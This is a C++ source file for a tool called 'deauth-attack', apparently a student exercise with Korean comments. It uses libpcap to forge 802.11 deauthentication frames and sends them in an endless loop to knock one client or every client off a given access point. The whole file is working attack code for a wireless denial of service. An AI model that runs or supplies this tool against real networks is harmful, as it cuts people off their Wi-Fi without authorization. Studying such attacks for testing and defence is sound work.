#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <iso646.h>
#include "wireless.h"
#include "mac.h"
using namespace std;

struct ieee80211_deauth_header final
{
    ieee80211_radiotap_header radiotap_;
    ieee80211_MAC_header MAC_;
    fixed_parameter fp_;
};

void send_deauth(pcap_t *handle, Mac sa, Mac da, Mac bssid)
{
    ieee80211_deauth_header packet;

    packet.radiotap_.it_version = 0;
    packet.radiotap_.it_pad = 0;
    packet.radiotap_.it_len = 8;     //이 이상으로는 랜카드에 따라 다른 것이므로 설정할 필요 X
    packet.radiotap_.it_present = 0; //뭔지 모르겠지만 펼쳐보면 0이어서..

    packet.MAC_.type = ieee80211_MAC_header::DEAUTH;
    packet.MAC_.flags = 0;
    packet.MAC_.duration = 314; // aireplay 돌리면 314여서..
    packet.MAC_.da = da;
    packet.MAC_.sa = sa;
    packet.MAC_.bssid = bssid;
    packet.MAC_.seq = 0;

    packet.fp_.reason_code = 0x0007;

    int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(ieee80211_deauth_header));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

int main(int argc, char *argv[])
{
    //매개변수 확인(2개여야 함)
    if ((argc < 3) or (argc > 4))
    {
        printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
        printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
        return -1;
    }

    // pcap_open
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    while (1)
    {
        // AP broadcast frame
        if (argc == 3)
            send_deauth(handle, Mac(argv[2]), Mac("FF:FF:FF:FF:FF:FF"), Mac(argv[2]));
        // AP unicast
        if (argc == 4)
            send_deauth(handle, Mac(argv[2]), Mac(argv[3]), Mac(argv[2]));
        // Station unicast frame
        if (argc == 4)
            send_deauth(handle, Mac(argv[3]), Mac(argv[2]), Mac(argv[2]));

        sleep(1);
    }

    pcap_close(handle);
    return 0;
}
